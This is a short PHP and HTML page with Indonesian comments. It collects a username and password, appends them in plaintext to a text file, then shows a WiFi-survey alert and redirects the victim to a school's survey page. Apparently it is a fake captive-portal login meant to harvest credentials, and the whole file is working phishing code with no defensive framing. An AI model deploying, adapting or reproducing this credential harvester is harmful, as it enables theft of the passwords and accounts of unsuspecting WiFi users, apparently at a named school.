<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Variable setting
    $username = $_POST['u_name'];  // Ambil username
    $passcode = $_POST['pass'];    // Ambil password

    // Simpan data ke dalam berkas data.txt
    $fileContent = "Username: $username\r\nPassword: $passcode\r\n";
    $file = fopen("data.txt", "a"); // Membuka berkas data.txt untuk penulisan
    if ($file) {
        fwrite($file, $fileContent); // Menulis data ke berkas
        fclose($file); // Menutup berkas 
        echo "<script type='text/javascript'>alert('Silahkan Isi Servei Untuk menggunakan WIFI Menggunakan data celluler');
        window.location.replace('https://www.sman1adiluwih.sch.id/survey/');
        </script>";
    } else {
        echo "Gagal menyimpan data ke dalam berkas.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Form Simpan ke File .txt</title>
</head>
<body>
    <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <label for="u_name">Username:</label>
        <input type="text" name="u_name" id="u_name" required>
        <br>
        <label for="pass">Password:</label>
        <input type="password" name="pass" id="pass" required>
        <br>
        <input type="submit" value="Kirim">
    </form>
</body>
</html>
